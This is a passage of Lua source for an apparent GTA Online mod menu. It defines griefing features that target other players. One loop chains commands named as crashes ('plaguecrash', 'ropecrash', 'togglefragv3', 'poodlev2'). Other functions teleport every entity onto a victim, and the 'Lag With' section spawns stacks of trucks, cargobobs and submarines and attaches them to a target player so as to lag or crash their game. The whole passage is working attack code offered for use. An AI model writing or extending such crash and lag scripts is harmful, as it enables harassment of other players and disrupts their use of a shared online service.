        menu.trigger_commands("badnet" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("tpallentities" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("rainpeds" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("rainveh" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("ptfxclown" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
            util.yield(5000)
        menu.trigger_commands("chaosyeet" .. players.get_name(pid))
        menu.trigger_commands("blackholeoffset" .. players.get_name(pid) .. " 0")
            util.yield(5000)
        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 45")
        menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
                util.yield(5000)
        menu.trigger_commands("plaguecrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
        menu.trigger_commands("ropecrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
        menu.trigger_commands("toggleweedcrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
        menu.trigger_commands("togglemath"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
        menu.trigger_commands("togglefragv3"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
        menu.trigger_commands("poodlev2"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(5000)
    else
        menu.trigger_commands("badnet" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("tpallentities" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("rainpeds" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("rainveh" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("ptfxelectric" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("ptfxsmoke" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("ptfxclown" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("ptfxextinguisher" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("ptfxwatermist" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("chaosyeet" .. players.get_name(pid))
            util.yield(100)
        menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("plaguecrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("ropecrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("toggleweedcrash"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("togglemath"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("togglefragv3"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        menu.trigger_commands("poodlev2"..PLAYER.GET_PLAYER_NAME(pid))
            util.yield(100)
        end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local pteleportEntities = menu.list(newcrash, "Teleport Entities to Player", {}, "")

menu.toggle_loop(pteleportEntities, "Teleport ALL Entities to Player", {"tpallentities"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
    notification("Tp All Entities Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    if on_toggle then
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    else
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    end
end)

menu.action(pteleportEntities, "TP Peds on Player", {"tppeds"}, "", function ()
    TpAllPeds(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(pteleportEntities, "TP Peds on Player", {"toggletppeds"}, "", function (on_toggle)
        if on_toggle then
            TpAllPeds(pid)
        else
            TpAllPeds(pid)
        end
end)

menu.action(pteleportEntities, "TP All Vehicles on Player", {"tpvehs"}, "", function ()
    TpAllVehs(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(pteleportEntities, "TP All Vehicles on Player", {"toggletppedstpvehs"}, "", function (on_toggle)
        if on_toggle then
            TpAllVehs(pid)
        else
            TpAllVehs(pid)
        end
end)

menu.action(pteleportEntities, "TP All Objects on Player", {"tpobjs"}, "", function ()
    TpAllObjects(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(pteleportEntities, "TP All Objects on Player", {"tpobjs"}, "", function (on_toggle)
        if on_toggle then
            TpAllObjects(pid)
        else
            TpAllObjects(pid)
        end
end)

menu.action(pteleportEntities, "TP All Pickups on Player", {"tppickups"}, "", function ()
    TpAllPickups(pid)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(pteleportEntities, "TP All Pickups on Player", {"tppickups"}, "", function (on_toggle)
        if on_toggle then
            TpAllPickups(pid)
        else
            TpAllPickups(pid)
        end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	lagwithss = menu.list(newcrash, "Lag With Shit", {}, "", function(); end)

    
menu.toggle_loop(lagwithss, "Lag With Armytrailer2", {"lagwitharmytrailer2"}, "", function()
    notification("Lag With Armytrailer2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("armytrailer2")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With Barracks", {"lagwithbarracks"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("barracks")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With Barracks3", {"lagwithbarracks3"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("barracks3")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With dune", {"lagwithdune"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("dune")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With Tug's", {"lagwithtugs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Tug's V2", {"lagwithtugsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("tug")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(10000)
end)

menu.toggle_loop(lagwithss, "Lag With Cargobob's", {"lagwithcargos"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)



menu.toggle_loop(lagwithss, "Lag With Cargobob's V2", {"lagwithcargosv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("cargobob")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end)

menu.toggle_loop(lagwithss, "Lag With Sub's", {"lagwithsubs"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3

    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
    util.yield(0)
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.toggle_loop(lagwithss, "Lag With Sub's V2", {"lagwithsubsv2"}, "", function()
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local khanjali = util.joaat("kosatka")
    STREAMING.REQUEST_MODEL(khanjali)
    while not STREAMING.HAS_MODEL_LOADED(khanjali) do
        util.yield()
    end

    local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, id, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(vehicle1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
